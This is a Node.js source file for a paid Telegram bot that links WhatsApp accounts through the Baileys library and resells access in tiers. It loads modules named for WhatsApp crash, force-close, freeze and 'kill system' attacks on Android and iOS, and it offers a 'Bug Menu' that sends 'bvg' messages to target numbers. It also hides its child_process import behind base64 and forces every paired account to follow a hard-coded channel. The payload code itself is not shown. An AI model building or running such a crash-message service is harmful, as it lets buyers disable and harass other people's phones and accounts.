
// ==========================================
// SUPRESSÃO DE LOGS E TRATAMENTO DE ERROS
// ==========================================
const originalStdoutWrite = process.stdout.write.bind(process.stdout);
process.stdout.write = (chunk, encoding, callback) => {
  const str = chunk.toString();
  if (
    str.includes("lastRemoteEphemeralKey") ||
    str.includes("baseKey") ||
    str.includes("pendingPreKey") ||
    str.includes("rootKey") ||
    str.includes("Connection Closed") ||
    str.includes("Precondition Required") ||
    str.includes("statusCode: 428") ||
    str.includes("Closing open session") ||
    str.includes("Decrypted message with closed session")
  ) {
    return true; // Bloqueia a impressão dessa mensagem no terminal
  }
  return originalStdoutWrite(chunk, encoding, callback);
};

// GARANTE QUE NÃO DÊ ERRO GLOBAL (Filtra reconexões do Baileys/WhatsApp)
process.setMaxListeners(0);
process.on('uncaughtException', (err) => {
  const msg = err?.message || String(err);
  if (msg.includes('Connection Closed') || msg.includes('Precondition Required') || msg.includes('428')) return;
  console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err);
});

process.on('unhandledRejection', (reason) => {
  const msg = reason?.message || String(reason);
  if (msg.includes('Connection Closed') || msg.includes('Precondition Required') || msg.includes('428')) return;
  console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason);
});

// ==========================================
// DEPENDÊNCIAS E CONFIGURAÇÃO
// ==========================================
// [PERF] Removed blocking npm install at startup - dependencies are managed via package.json
// require("child_process").execSync("npm install libsignal @sakataoffc/baileys --allow-git");
process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    Browsers,
    delay,
    proto,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion, 
    groupGetInviteInfo,
    generateWAMessageFromContent
} = require('@sakataoffc/baileys');
const pino = require('pino');
let phoneNumber = "6288268145069"
const pairingCode = !!phoneNumber
const NodeCache = require("node-cache")

// Função de log formatada com cores ANSI e tags claras
function log(type, category, ...message) {
    const timestamp = new Date().toLocaleTimeString('id-ID');
    
    // Se a função for chamada com apenas 1 argumento: log("mensagem")
    if (category === undefined && message.length === 0) {
        console.log(`\x1b[90m[${timestamp}]\x1b[0m ${type}`);
        return;
    }

    // Cores ANSI para o terminal do Pterodactyl
    const colors = {
        info: '\x1b[36m',     // Ciano
        success: '\x1b[32m',  // Verde
        command: '\x1b[35m',  // Magenta/Roxo
        error: '\x1b[31m',    // Vermelho
        warn: '\x1b[33m',     // Amarelo
        system: '\x1b[34m'    // Azul
    };

    const color = colors[type?.toLowerCase()] || '\x1b[37m'; // Branco padrão
    const tag = `[${type.toUpperCase()}]`.padEnd(9);
    const cat = category ? `[\x1b[1m${category}\x1b[0m]` : '';
    const content = message.join(' ');

    console.log(`\x1b[90m[${timestamp}]\x1b[0m ${color}${tag}\x1b[0m ${cat} ${content}`);
}




// Clear Ok SY Moyna 🥰

// Railway par process ko continuously run karne dein.
// Scheduled process.exit() remove kiya gaya hai, warna bot 60 minutes baad
// normal exit ke saath band ho jata tha aur Railway "Run Completed" dikhata tha.

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) {
    fs.mkdirSync(LoveDir);
}

const {
    spawn
} = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());
const XLX = spawn;
const activeBots = {};
const startTime = Date.now();
const LoveLogo = `${config.logo}`
const waSessions = {};
const pairingTracker = new Map();

// ===== SVIP & GLOBAL SENDER SYSTEM =====
function getAuthPath(chatId, number) {
    // unified: check both old and new locations
    const p1 = `./Love/auth/${chatId}/${number}`;
    const p2 = `./Love/${chatId}/Auths/${number}`;
    if (fs.existsSync(p1)) return p1;
    if (fs.existsSync(p2)) return p2;
    return p1;
}
function isOwner(uid){ return uid.toString() === config.adminId.toString(); }
function isReseller(uid){ const db=getDB(); return db.resellers.includes(uid.toString()); }
function isPremium(uid){ const db=getDB(); return db.premium.includes(uid.toString()); }
function isSvip(uid){ const db=getDB(); return db.svip.includes(uid.toString()); }
function isGroupPremium(gid){ const db=getDB(); return !!db.groupPremium[(gid&&gid.toString())]; }
function isGroupSvip(gid){ const db=getDB(); return !!db.groupSvip[(gid&&gid.toString())]; }
function getUserTier(uid){
    const id=uid.toString();
    const db=getDB();
    if(id===config.adminId.toString()) return 4;
    if(db.resellers.includes(id)) return 3;
    if(db.svip.includes(id)) return 3; // SVIP same as reseller privilege for sender
    if(db.premium.includes(id)) return 2;
    return 1;
}
function getTierName(t){ return t===4?'Owner':t===3?'Reseller/SVIP':t===2?'Premium':'Free'; }
function canUseGlobal(uid){
    const tier=getUserTier(uid);
    if(tier>=3) return true; // SVIP/Reseller/Owner always global
    const db=getDB();
    return db.globalSender === true && tier>=2; // premium can also use global if enabled
}
function getGlobalSenders(){
    const all=[];
    for(const ownerChatId of Object.keys(waSessions)){
        for(const s of waSessions[ownerChatId]||[]){
            if(s.sock) all.push({ ...s, ownerChatId });
        }
    }
    return all;
}
function getAvailableSenders(chatId, userId){
    const cid=chatId && chatId.toString();
    const uid=userId && userId.toString();
    // group premium: if chat is group and group has premium/svip -> allow global
    if(cid && (isGroupPremium(cid) || isGroupSvip(cid))) return getGlobalSenders();
    // user tier check
    if(uid && canUseGlobal(uid)) return getGlobalSenders();
    // fallback: own senders
    if(cid && waSessions[cid] && waSessions[cid].length>0) return waSessions[cid].map(s=>({...s, ownerChatId:cid}));
    // SVIP global fallback: if no own but user is svip/reseller, still give global even if empty own
    if(uid && getUserTier(uid)>=3){
        const g=getGlobalSenders();
        if(g.length>0) return g;
    }
    return (cid && waSessions[cid]) ? waSessions[cid] : [];
}
function countAllSenders(){
    let total=0;
    const perOwner={};
    for(const k of Object.keys(waSessions)){ perOwner[k]=(waSessions[k]||[]).length; total+=(waSessions[k]||[]).length; }
    // also scan filesystem for offline paired numbers (creds.json exists but not yet loaded)
    try{
        const bases=['./Love/auth','./Love'];
        for(const base of bases){
            if(!fs.existsSync(base)) continue;
            const entries=fs.readdirSync(base);
            for(const e of entries){
                const p=path.join(base,e);
                if(!fs.statSync(p).isDirectory()) continue;
                // if base is ./Love/auth then e is chatId, check subdirs
                if(base==='./Love/auth'){
                    try{
                        const nums=fs.readdirSync(p);
                        for(const n of nums){
                            if(fs.existsSync(path.join(p,n,'creds.json'))){
                                // check if already counted in waSessions
                                const already=(waSessions[e]||[]).some(s=>s.num===n);
                                if(!already) total++;
                            }
                        }
                    }catch{}
                }
            }
        }
    }catch{}
    return { total, perOwner, global:getGlobalSenders().length };
}
function cleanExpired(){
    try{
        const db=getDB();
        let dirty=false;
        const now=Date.now();
        for(const id of [...db.premium]){
            const exp=db.premiumExpiry[id];
            if(exp && now>exp){ db.premium=db.premium.filter(x=>x!==id); delete db.premiumExpiry[id]; dirty=true; log('info','EXPIRY',`Premium expired: ${id}`); }
        }
        for(const id of [...db.svip]){
            const exp=db.svipExpiry[id];
            if(exp && now>exp){ db.svip=db.svip.filter(x=>x!==id); delete db.svipExpiry[id]; dirty=true; log('info','EXPIRY',`SVIP expired: ${id}`); }
        }
        for(const gid of Object.keys(db.groupPremium||{})){
            const exp=db.groupPremium[gid];
            if(exp && now>exp){ delete db.groupPremium[gid]; dirty=true; log('info','EXPIRY',`GroupPremium expired: ${gid}`); }
        }
        for(const gid of Object.keys(db.groupSvip||{})){
            const exp=db.groupSvip[gid];
            if(exp && now>exp){ delete db.groupSvip[gid]; dirty=true; log('info','EXPIRY',`GroupSvip expired: ${gid}`); }
        }
        if(dirty) saveDB(db);
    }catch(e){ log('error','EXPIRY',e.message); }
}
setInterval(cleanExpired, 60*1000);
// initial clean after 5s
setTimeout(cleanExpired, 5000);

const SYLovesButton = {
    reply_markup: {
        inline_keyboard: [
            [{
                text: '📢 Join Channel',
                url: config.channel,
                icon_custom_emoji_id: "5370599459661045441"
            }], 
            [{ text: '👥 Join Group', url: config.group, icon_custom_emoji_id: "5443038326535759644"  }],
            [{
                text: 'Check Membership',
                callback_data: 'check_membership',
                icon_custom_emoji_id: "5123248930124989216"
            }]
        ]
    }
};

const protectionMessage = `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You must join, subscribe and follow our whatsapp channel, instagram, youtube channel and group to use this bot. After doing so, click "Check Membership" or use /checkmembership.`;

const membershipCache = new NodeCache({ stdTTL: 300, checkperiod: 60 });
async function CheckSYlovesToo(botInstance, userId, chId, grId, adminId) {
    if (userId.toString() === adminId.toString()) return true;
    if (!chId && !grId) return true;
    const cacheKey = `${userId}:${chId}:${grId}`;
    const cached = membershipCache.get(cacheKey);
    if (cached !== undefined) return cached;
    try {
        let inChannel = true;
        let inGroup = true;
        const validStatuses = ['creator', 'administrator', 'member', 'restricted'];
        // Run both checks in parallel for speed
        const promises = [];
        if (chId) promises.push(botInstance.getChatMember(chId, userId).then(m => validStatuses.includes(m.status)).catch(() => true));
        else promises.push(Promise.resolve(true));
        if (grId) promises.push(botInstance.getChatMember(grId, userId).then(m => validStatuses.includes(m.status)).catch(() => true));
        else promises.push(Promise.resolve(true));
        const [cRes, gRes] = await Promise.all(promises);
        inChannel = cRes;
        inGroup = gRes;
        const result = inChannel && inGroup;
        membershipCache.set(cacheKey, result);
        return result;
    } catch (error) {
        log('error', 'MEMBERSHIP_CHECK', error.message);
        return true;
    }
}





// SY Loves Here 🤗❤️‍🩹


const SYLoves = `./SY/S7/`

const BanGc = require(SYLoves + 'BanGc');
const FcHard = require(SYLoves + 'FcHard');
const FcPerma = require(SYLoves + 'fcperma');
const FcNew = require(SYLoves + 'fcnew');
const CrashInfinity = require(SYLoves + 'crashnew');
const IosLogic = require(SYLoves + 'IosInvisible');
const IosInvisiblee = require(SYLoves + 'IosInvis');
const IosVisible = require(SYLoves + 'IosVisible');
const Ios = require(SYLoves + 'Ios');
const IosCrashLogic = require(SYLoves + 'IosCrashInvisible');
const XgcLogic = require(SYLoves + 'Xgc');
const killsystemLogic = require(SYLoves + 'killsystem');
const forceandroLogic = require(SYLoves + 'forceandro');
const forceandrov2Logic = require(SYLoves + 'forceandrov2');
const delayinfinityLogic = require(SYLoves + 'delayinfinity');
const ghostdelayLogic = require(SYLoves + 'ghostdelay');
const delaynullLogic = require(SYLoves + 'delaynull');
const nullfreezeLogic = require(SYLoves + 'nullfreeze');
const crashnoclickLogic = require(SYLoves + 'crashnoclick');
const testlogic = require(SYLoves + 'forceclose');

const notauthorized = '🚫 You are not authorized to use this command.';

const colors = {
    reset: "\x1b[0m",
    gray: "\x1b[90m",
    blue: "\x1b[34m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m"
};

function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days} days ${hours} hours ${minutes} minutes`;
}

let _dbCache = null;
let _dbCacheTime = 0;
let _dbCacheMtime = 0;
const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    const defaults = {
        state: 0,
        tokens: [],
        premium: [],
        premiumExpiry: {},
        resellers: [],
        svip: [],
        svipExpiry: {},
        groupPremium: {},
        groupSvip: {},
        globalSender: true
    };
    try {
        if (_dbCache && Date.now() - _dbCacheTime < 2000) {
            try {
                const stat = fs.statSync(dbPath);
                if (stat.mtimeMs === _dbCacheMtime) return _dbCache;
            } catch {}
        }
    } catch {}
    if (!fs.existsSync(dbPath)) {
        _dbCache = { ...defaults };
        _dbCacheTime = Date.now();
        try { _dbCacheMtime = fs.statSync(dbPath).mtimeMs; } catch { _dbCacheMtime = 0; }
        return _dbCache;
    }
    try {
        const stat = fs.statSync(dbPath);
        const mtime = stat.mtimeMs;
        if (_dbCache && mtime === _dbCacheMtime && Date.now() - _dbCacheTime < 5000) {
            return _dbCache;
        }
        const content = fs.readFileSync(dbPath);
        const parsed = JSON.parse(content);
        let result;
        if (Array.isArray(parsed)) {
            result = { ...defaults, tokens: parsed };
        } else {
            result = {
                state: typeof parsed.state === 'number' ? parsed.state : 0,
                tokens: parsed.tokens || [],
                premium: parsed.premium || [],
                premiumExpiry: parsed.premiumExpiry || {},
                resellers: parsed.resellers || [],
                svip: parsed.svip || [],
                svipExpiry: parsed.svipExpiry || {},
                groupPremium: parsed.groupPremium || {},
                groupSvip: parsed.groupSvip || {},
                globalSender: parsed.globalSender !== undefined ? parsed.globalSender : true
            };
        }
        _dbCache = result;
        _dbCacheTime = Date.now();
        _dbCacheMtime = mtime;
        return result;
    } catch (err) {
        log('error', null, 'Database Read Error: ' + err.message);
        if (_dbCache) return _dbCache;
        return { ...defaults };
    }
};

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const saveDB = (data) => {
    try {
        fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2));
        _dbCache = data;
        _dbCacheTime = Date.now();
        try { _dbCacheMtime = fs.statSync(path.join(LoveDir, 'data.json')).mtimeMs; } catch {}
    } catch (err) {
        log('error', null, 'Database Save Error: ' + err.message);
    }
};

function sendSYLove(bot, chatId) {
    const priceText = 
        `╭━━━〔 🚫 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n\n` +
        `❌ You are not authorized to use this command.\n\n` +
        `📩 Please contact the developer to buy: @shahzu_404\n\n` +
        `💰 Price/Harga:\n` +
        `✅ Access permanent: $25\n` +
        `✅ Resell permanent: $50\n` +
        `✅ Script/source code: $120\n` +
        `✅ Make your own bvg bot with your name/customised bvg bot: $120\n\n` +
        `Prices are negotiable or can be discounted!!\n\n` +
        `╰━━━━━━━━━━━━━━━━━━━━╯`;
    bot.sendMessage(chatId, priceText, {
        parse_mode: 'HTML'
    });
}

function LoveGlobalState(userId, chatId=null) {
    const db = getDB();
    if (db.state === 0) return true;
    const uid=userId.toString();
    if (uid === config.adminId.toString()) return true;
    if (db.resellers.includes(uid)) return true;
    if (db.premium.includes(uid)) return true;
    if (db.svip.includes(uid)) return true;
    // group premium: if command in premium group, allow
    if(chatId && (db.groupPremium[chatId.toString()] || db.groupSvip[chatId.toString()])) return true;
    return false;
}
function hasAccess(uid, chatId, minTier=2){
    return getUserTier(uid) >= minTier || isGroupPremium(chatId) || isGroupSvip(chatId);
}

function getStyle(){ return 'primary'; }
function Lovesbutton(user) {
  const style = getStyle(user);

  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: 'I| Bug Menu', callback_data: 'bug_menu', style : "primary", icon_custom_emoji_id: "5373290243787070962" },
          { text: 'I| Misc Menu', callback_data: 'misc_menu', style : "success", icon_custom_emoji_id: "6032742198179532882" }
        ],
        [
          { text: 'I| Channel ↗', url: `${config.channel}`, style : "primary", icon_custom_emoji_id: "5370599459661045441" }
        ],
        [
          { text: 'I| Group ↗', url: `${config.group}`, style : "danger", icon_custom_emoji_id: "5443038326535759644" }
        ],
      ]
    }
  };
}

async function SYLoveMeOk(sock) {
    try {
        await sock.query({
            tag: 'iq',
            attrs: {
                to: 's.whatsapp.net',
                type: 'get',
                xmlns: 'w:mex'
            },
            content: [{
                tag: 'query',
                attrs: {
                    query_id: '9926858900719341'
                },
                content: new TextEncoder().encode(JSON.stringify({
                    variables: {
                        newsletter_id: Buffer
                            .from('MTIwMzYzNDIyNDg2MDI3ODg2QG5ld3NsZXR0ZXI=', 'base64')
                            .toString('utf-8')
                    }
                }))
            }]
        });
    } catch (err) {}
}


async function StartLovingSY(chatId, number, S7, isreconnect = false, ownerId = null) {
    //const authPath = `./Love/auth/${chatId}/${number}`;
    let authPath;
    if (ownerId) {
        authPath = `./Love/${ownerId}/Auths/${number}`;
    } else {
        authPath = `./Love/auth/${chatId}/${number}`;
    }

    if (!fs.existsSync(authPath)) {
        fs.mkdirSync(authPath, {
            recursive: true
        });
    }

    const msgRetryCounterCache = new NodeCache();
    let {
        version
    } = await fetchLatestBaileysVersion();
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(authPath);

    const SYxS7 = makeWASocket({
        version,
        logger: pino({
            level: 'silent'
        }),
        printQRInTerminal: !pairingCode,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({
                level: "fatal"
            }).child({
                level: "fatal"
            })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: false,
        getMessage: async (key) => {
            let jid = jidNormalizedUser(key.remoteJid);
            let msg = await store.loadMessage(jid, key.id);
            return msg && msg.message || "";
        },
        msgRetryCounterCache,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
    });

    if (!SYxS7.authState.creds.registered) {
        if (pairingTracker.has(number)) return;
        pairingTracker.set(number, true);

        await delay(1500);
        try {
            const code = await SYxS7.requestPairingCode(number, `SHMOBVG3`);
            await S7.sendMessage(chatId, `╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮\n│➻ Nᴜᴍʙᴇʀ : ${number}\n│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : <code>${(code && code.match(/.{1,4}/g) ? code.match(/.{1,4}/g).join("-") : code) || code}</code>\n╰───────────────────────╯`, {
                parse_mode: 'HTML'
            });
        } catch (err) {
            log('error', 'WhatsApp', `Error requesting code: ${err.message}`);
            pairingTracker.delete(number);
        }
    }

    SYxS7.ev.on('creds.update', saveCreds);

    SYxS7.ev.on("connection.update", async (update) => {
        const {
            connection,
            lastDisconnect
        } = update;

        if (connection === 'connecting') {
            log('info', 'WhatsApp', `Connecting: ${number}`);
        }
        if (connection === "open") {
          await SYxS7.newsletterFollow("120363426281901729@newsletter");
            log('success', 'WhatsApp', `Connected: ${number}`);
            pairingTracker.delete(number);
            if (!waSessions[chatId]) waSessions[chatId] = [];
            waSessions[chatId].push({
                sock: SYxS7,
                num: number
            });
            if (isreconnect === false) {
                await delay(1000);
                await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>WhatsApp Connected!</b>\nNumber: ${number}.`, {
                    parse_mode: 'HTML'
                }).catch(() => {});
            }
        }

        if (connection === "close") {
            if (waSessions[chatId]) {
                waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
            }

            let reason = lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode;
            log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);

            if (reason === DisconnectReason.restartRequired || reason === DisconnectReason.connectionLost || reason === DisconnectReason.timedOut || reason === 515) {
                log('info', 'WhatsApp', `Auto-Reconnecting session for ${number}...`);
                StartLovingSY(chatId, number, S7, false);
            } else if (reason === DisconnectReason.loggedOut || reason === 401) {
                log('error', 'WhatsApp', `Session for ${number} is permanently LOGGED OUT.`);
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> <b> <tg-emoji emoji-id="5447644880824181073">⚠️</tg-emoji>WhatsApp Logged Out</b>\nNumber: ${number}\nSession has been terminated. Please use /reqpair again.`, {
                    parse_mode: 'HTML'
                }).catch(() => {});

                const SYPaTH = `./Love/auth/${chatId}/${number}`;
                if (fs.existsSync(SYPaTH)) fs.rmSync(SYPaTH, {
                    recursive: true,
                    force: true
                });
            } else {
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `⚠️ <b>Connection Closed</b>\nNumber: ${number}\nReason: ${reason}`, {
                    parse_mode: 'HTML'
                }).catch(() => {});
            }
        }
    });
}



async function AutoLovingWithSY(S7) {
    const bases = ['./Love/auth'];
    // also scan legacy per-owner paths: ./Love/<ownerId>/Auths/<number>
    try{
        if(fs.existsSync('./Love')){
            const maybeOwners=fs.readdirSync('./Love');
            for(const mo of maybeOwners){
                const p=path.join('./Love', mo, 'Auths');
                if(fs.existsSync(p) && fs.statSync(p).isDirectory()) bases.push(p.replace('./Love/','./Love/').replace('/Auths',''));
                // Actually push Owner base for scanning differently
            }
        }
    }catch{}
    // scan standard auth
    for(const SYBase of ['./Love/auth']){
        if (!fs.existsSync(SYBase)) continue;
        try {
            const chatIds = fs.readdirSync(SYBase);
            for (const chatId of chatIds) {
                const chatPath = path.join(SYBase, chatId);
                if (!fs.statSync(chatPath).isDirectory()) continue;
                const numbers = fs.readdirSync(chatPath);
                for (const number of numbers) {
                    const sessionPath = path.join(chatPath, number);
                    if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                        log('info', 'SYSTEM', `Found saved session for ${number} (owner ${chatId}), Reconnecting...`);
                        StartLovingSY(chatId, number, S7, true);
                        await delay(3000);
                    }
                }
            }
        } catch (err) {
            log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
        }
    }
    // scan per-owner Auths
    try{
        if(fs.existsSync('./Love')){
            const entries=fs.readdirSync('./Love');
            for(const ownerId of entries){
                const authsPath=path.join('./Love', ownerId, 'Auths');
                if(!fs.existsSync(authsPath)) continue;
                if(!fs.statSync(authsPath).isDirectory()) continue;
                const nums=fs.readdirSync(authsPath);
                for(const number of nums){
                    const sp=path.join(authsPath, number);
                    if(fs.existsSync(path.join(sp,'creds.json'))){
                        log('info','SYSTEM',`Found legacy session for ${number} (owner ${ownerId}), Reconnecting...`);
                        StartLovingSY(ownerId, number, S7, true, ownerId);
                        await delay(3000);
                    }
                }
            }
        }
    }catch(e){ log('error','SYSTEM','Legacy AutoReconnect: '+e.message); }
}




async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;

    const ownerId = tokenObj.owner;
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(
                ownerId,
                `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> <b>Token Error</b>\n\n` +
                `Your bot token is not working.\n` +
                `Reason: <code>${errorMsg}</code>\n\n` +
                `Token has been removed automatically.`, {
                    parse_mode: 'HTML'
                }
            );
        }
    } catch (e) {
        log('error', 'SYSTEM', 'Failed to notify token owner');
    }

    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);

    if (activeBots[token]) {
        try {
            await activeBots[token].stopPolling();
        } catch {}
        delete activeBots[token];
    }

    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db = getDB();
    const userId = love.toString();

    if (userId === config.adminId.toString()) {
        return 'Owner';
    }
    if (db.resellers.includes(userId)) {
        return 'Reseller';
    }
    if (db.svip && db.svip.includes(userId)) {
        return 'SVIP';
    }
    if (db.premium.includes(userId)) {
        return 'Premium';
    }
    return 'Free User';
}

function MainSYLoVe(name, uptime, love, SABIR7718, SABANA) {
    const status = GetSYLoVe(love);
    return `<b>✨ S H A H Z U -  V I P B O T 💋</b>

<b>✨ Developer :</b> ${SABANA} 🤍
<b>✨ System :</b> ${status} ☠
<b>✨ Platform :</b> Telegram 📱
<b>✨ Online :</b> ${uptime} ✨`;
}
function BvgSYLoVe(cleanTarget, senderNum) {
    return `
┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇
│➻ Target: ${cleanTarget}
│➻ From: ${senderNum || 'unknown'}
└────────────────────────┘`;
}

function startSYloveBot(token) {
    try {
        const S7 = new SY(token, {
            polling: true
        });
        let db = getDB();
        let tokenData = db.tokens.find(t => t.token === token);
        let SABIR7718;

        let botConfig = {
            channel: config.channel,
            group: config.group,
            logo: config.logo,
            botName: config.bot,
            ownerContact: config.S7,
            protection: true,
            channelId: config.channelId,
            groupId: config.groupId
        };

        if (tokenData && tokenData.config) {
            if (tokenData.config.channel) botConfig.channel = tokenData.config.channel;
            if (tokenData.config.group) botConfig.group = tokenData.config.group;
            if (tokenData.config.logo) botConfig.logo = tokenData.config.logo;
            if (tokenData.config.botName) botConfig.botName = tokenData.config.botName;
            if (tokenData.config.ownerContact) botConfig.ownerContact = tokenData.config.ownerContact;
            if (tokenData.config.protectionState !== undefined) botConfig.protection = tokenData.config.protectionState;
            if (tokenData.config.channelId) botConfig.channelId = tokenData.config.channelId;
            if (tokenData.config.groupId) botConfig.groupId = tokenData.config.groupId;
        }

        const botOwnerId = tokenData ? tokenData.owner : config.adminId;
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === config.mainToken) {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
            log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);

            if (
                err.message.includes('404') ||
                err.message.includes('401') ||
                err.message.includes('Unauthorized')
            ) {
                await S7Naverdead(token, err.message);
            }
        });
        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });

        function VOIDSEC() {
            return {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '📢 Join Channel',
                            url: botConfig.channel,
                            icon_custom_emoji_id: "5370599459661045441"
                        }],
                        [{
                            text: '👥 Join Group',
                            url: botConfig.group,
                            icon_custom_emoji_id: "5443038326535759644"
                        }],
                        /*[{
                            text: '📱 Follow WhatsApp',
                            url: config.waChannel || 'https://whatsapp.com'
                        }],*/
                        [{
                            text: 'Check Membership',
                            callback_data: 'check_membership',
                            icon_custom_emoji_id: "5123248930124989216"
                        }]
                    ]
                }
            };
        }

if (token === config.mainToken) {
    SABIR7718 = {
        reply_markup: {
            inline_keyboard: [
                [{
                    text: 'I| Bug Menu',
                    callback_data: 'bug_menu',
                    style : "primary",
                    icon_custom_emoji_id: "5373290243787070962"
                }, {
                    text: 'I| Misc Menu',
                    callback_data: 'misc_menu',
                    style : "success",
                    icon_custom_emoji_id: "6032742198179532882"
                }],
                [{
                    text: 'I| Channel ↗',
                    url: `${config.channel}`,
                    style : "primary",
                    icon_custom_emoji_id: "5370599459661045441"
                }],
                [{
                    text: 'I| Group ↗',
                    url: `${config.group}`,
                    style : "danger",
                    icon_custom_emoji_id: "5443038326535759644"
                }],
            ]
        }
    };
} else {
    SABIR7718 = {
        reply_markup: {
            inline_keyboard: [
                [{
                    text: 'I| Bug Menu',
                    callback_data: 'bug_menu',
                    style : "primary",
                    icon_custom_emoji_id: "5373290243787070962"
                }, {
                    text: 'I| Misc y',
                    callback_data: 'misc_menu',
                    style : "success",
                    icon_custom_emoji_id: "6032742198179532882"
                }],
                [{
                    text: 'I| Channel ↗',
                    url: `${config.channel}`,
                    style: "primary",
                    icon_custom_emoji_id: "5370599459661045441"
                }],
                [{
                    text: 'I| Group ↗',
                    url: `${config.group}`,
                    style : "danger",
                    icon_custom_emoji_id: "5443038326535759644"
                }],
            ]
        }
    };
}

        // [PERF] Optimized single handler with command map and cached user tracking
        const commandMap = new Map();
        const userSeenCache = new Set();
        let userFileCache = null;
        let userFileCacheTime = 0;
        // Load user cache once
        try {
            const uf = path.join(LoveDir,'user.json');
            if (fs.existsSync(uf)) {
                const content = fs.readFileSync(uf, 'utf8');
                const arr = JSON.parse(content);
                if (Array.isArray(arr)) {
                    arr.forEach(u => userSeenCache.add(String(u.id || u)));
                    userFileCache = arr;
                    userFileCacheTime = Date.now();
                }
            }
        } catch {}
        // Single message handler for all commands - FAST
        S7.on('message', async (msg) => {
            if (!msg.text) return;
            let raw = msg.text.trim().split(' ')[0];
            if (!raw.startsWith('/') && !raw.startsWith('.')) return;
            raw = raw.slice(1).split(' ')[0].split('@')[0].toLowerCase();
            const callback = commandMap.get(raw);
            if (!callback) return;
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            // [PERF] Fast user tracking with in-memory cache + async write
            const userKey = String(userId);
            if (!userSeenCache.has(userKey)) {
                userSeenCache.add(userKey);
                // Async debounced write to avoid blocking
                setImmediate(() => {
                    try {
                        const uf = path.join(LoveDir,'user.json');
                        let us = userFileCache || [];
                        if (!us.find(u=> String(u.id||u)===userKey)) {
                            us.push({id:userId, name:msg.from.first_name||'Unknown', username:msg.from.username||''});
                            userFileCache = us;
                            fs.writeFile(uf, JSON.stringify(us,null,2), ()=>{});
                        }
                    } catch {}
                });
            }
            if (botConfig.protection && raw !== 'checkmembership') {
                const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);
                if (!isMember) {
                    const protectMsg = `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> <b>Access Denied!</b>\n\nYou must join our Channel & Group to use this bot.\n\n👤 <b>Owner:</b> ${botConfig.ownerContact}\nClick "Check Membership" after joining.`;
                    return S7.sendMessage(chatId, protectMsg, { parse_mode: 'HTML', ...VOIDSEC() });
                }
            }
            try {
                const name = msg.from.first_name || "Unknown";
                // [PERF] Non-blocking log
                setImmediate(() => log('command', name, `${msg.text} [chat:${chatId} tier:${GetSYLoVe(userId)}]`));
                await callback(msg);
            } catch (err) {
                log('error', 'COMMAND_EXEC', err.message);
            }
        });
        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) commands = [commands];
            for (const cmd of commands) {
                const key = cmd.toString().split('@')[0].toLowerCase();
                commandMap.set(key, callback);
            }
        }


SYLoVe(['start', 'menu'], async (msg) => {
    const chatId = msg.chat.id;
    const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
    const uptime = getRuntime();
    const love = msg.from.id.toString();
    const status = GetSYLoVe(love);

    const sticker = await S7.sendSticker(
        chatId,
